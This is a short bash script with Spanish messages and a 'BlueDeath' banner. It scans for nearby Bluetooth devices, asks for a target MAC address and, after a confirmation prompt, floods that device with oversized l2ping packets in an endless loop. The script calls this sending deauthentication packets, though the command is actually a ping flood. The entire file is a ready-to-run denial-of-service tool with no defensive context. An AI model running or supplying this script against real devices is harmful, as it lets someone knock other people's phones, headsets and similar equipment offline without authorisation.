#!/bin/bash

# Colores
RED="\e[91m"
GREEN="\e[92m"
BLUE="\e[94m"
PURPLE="\e[95m"
CYAN="\e[96m"
RESET="\e[0m"

# Función para imprimir el banner
imprimir_banner() {
    echo -e "${RED}"
    cat << "EOF"
 ▄▄▄▄    ██▓     █    ██ ▓█████ ▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██ 
▓█████▄ ▓██▒     ██  ▓██▒▓█   ▀ ▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒
▒██▒ ▄██▒██░    ▓██  ▒██░▒███   ░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░
▒██░█▀  ▒██░    ▓▓█  ░██░▒▓█  ▄ ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ 
░▓█  ▀█▓░██████▒▒▒█████▓ ░▒████▒░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓
░▒▓███▀▒░ ▒░▓  ░░▒▓▒ ▒ ▒ ░░ ▒░ ░ ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒
▒░▒   ░ ░ ░ ▒  ░░░▒░ ░ ░  ░ ░  ░ ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░
 ░    ░   ░ ░    ░░░ ░ ░    ░    ░ ░  ░    ░    ░   ▒    ░       ░  ░░ ░
 ░          ░  ░   ░        ░  ░   ░       ░  ░     ░  ░         ░  ░  ░
      ░                          ░                                                                                                                                                 
                                 by TheOffSecGirl
EOF
    echo -e "${RESET}"
}

# Imprimir banner
imprimir_banner

echo -e "${CYAN}[+] Verificando adaptador Bluetooth...${RESET}"
if ! hciconfig hci0 up &>/dev/null; then
    echo -e "${RED}[!] No se pudo activar el adaptador Bluetooth. Verifica que esté conectado.${RESET}"
    exit 1
fi

# Escanea dispositivos Bluetooth cercanos
echo -e "${PURPLE}[+] Escaneando dispositivos Bluetooth...${RESET}"
hcitool scan

echo -e "${GREEN}[+] Introduce la dirección MAC del dispositivo a atacar:${RESET}"
read -r target_mac

# Confirmar ataque
echo -e "${RED}[!] Se enviarán paquetes de desautenticación a $target_mac. ¿Continuar? (y/N)${RESET}"
read -r confirm
if [[ "$confirm" != "y" ]]; then
    echo -e "${BLUE}[!] Ataque cancelado.${RESET}"
    exit 0
fi

# Iniciar ataque
echo -e "${CYAN}[+] Iniciando ataque...${RESET}"
while true; do
    l2ping -i hci0 -s 600 -f "$target_mac" &>/dev/null
done
